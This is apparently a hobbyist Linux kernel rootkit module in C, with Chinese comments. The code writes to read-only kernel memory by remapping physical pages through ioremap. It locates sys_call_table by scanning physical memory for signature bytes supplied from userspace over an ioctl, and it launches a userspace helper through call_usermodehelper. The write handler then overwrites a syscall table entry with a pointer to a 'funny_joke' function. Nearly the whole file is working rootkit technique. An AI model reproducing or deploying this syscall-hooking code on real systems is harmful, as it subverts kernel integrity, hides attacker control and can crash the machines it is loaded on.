#include "pwhrootkit.h"
#include <linux/uaccess.h>
#include <linux/init_task.h>
#include <linux/kstrtox.h>
#include <linux/sched.h>
#include <linux/pid.h>

#define USER_KALLSYMS 0x1111
#define SEARCH_SYSCALL 0x2222

static size_t syscall_table_data[5];
static size_t get_syscall_data = 0;
static size_t syscall_table_addr;


struct kernel_args{
    void * content;
    int size;
};

/* 使用重映射来修改只读页面 */
static int arbitrary_remap_write(void *dst, void *src, size_t size){
    size_t phys_addr, phys_offset;
    size_t phys_ioremap_addr;
    /* 获取虚拟地址所在物理页帧的首地址 */
    phys_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
    /* 获取页内地址的偏移 */
    phys_offset = (size_t )dst & 0xfff;
    /* 重新映射该物理地址到另一个虚拟地址 */
    phys_ioremap_addr = (size_t)ioremap(phys_addr, PAGE_SIZE);
    /* 拷贝内容到该虚拟地址,从而间接拷贝到只读物理地址 */
    memcpy((size_t *)(phys_ioremap_addr + phys_offset), src, size);
    /* 最后调用该函数来解除映射 */
    iounmap((size_t *)phys_ioremap_addr);
    return 0;
}

static void sys_call_table_finder(void){
    /* 遍历内核,这里存放特征 */
    /* page_offset_base存放的是physmap的首虚拟地址,从这里开始就可以遍历所有的内核 */
    size_t *phys_mem = (size_t *)page_offset_base;

    char *argv[] = {
        "/sys_table_finder",
        NULL,
    };
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL,
    };

    /* 调用用户态程序 */
    /* UMH_WAIT_PROC这个标识符表示要等用户程序执行完毕 */
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if(!get_syscall_data){
        panic("failed to get the sycall data from userspace!");
    }
    for(size_t i = 0;; i++){
        if(phys_mem[i+0] == syscall_table_data[0]
        && phys_mem[i+1] == syscall_table_data[1]
        && phys_mem[i+2] == syscall_table_data[2]
        && phys_mem[i+3] == syscall_table_data[3]
        ){
            syscall_table_addr = (size_t)&(phys_mem[i]);
            printk(KERN_INFO "[peiwithhao rootkit] sys_call_table founded at %lx", syscall_table_addr);
            break;
        }
    }

}

static void funny_joke(void){
    printk("[peiwithhao rootkit] You are hooked by THE GREAT PEIWITHHAO ;)");
}



static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
    return 0;
}


static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    void *hook_ptr = funny_joke;
    arbitrary_remap_write((void *)(syscall_table_addr), &hook_ptr, sizeof(size_t));
    return 0;
}
static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    int ret;
    switch(cmd){
        case USER_KALLSYMS:
            ret = copy_from_user(syscall_table_data, (void *)arg, sizeof(syscall_table_data));
            get_syscall_data = 1;
            break;
        case SEARCH_SYSCALL:
            sys_call_table_finder();
            break;
        default:
            break;
    }
    return 0;
}
/* 打开类容 */
static int pwh_rootkit_open(struct inode *inode, struct file *file){
    return 0;
}
static int pwh_rootkit_release(struct inode *inode, struct file *file){
    return 0;
}
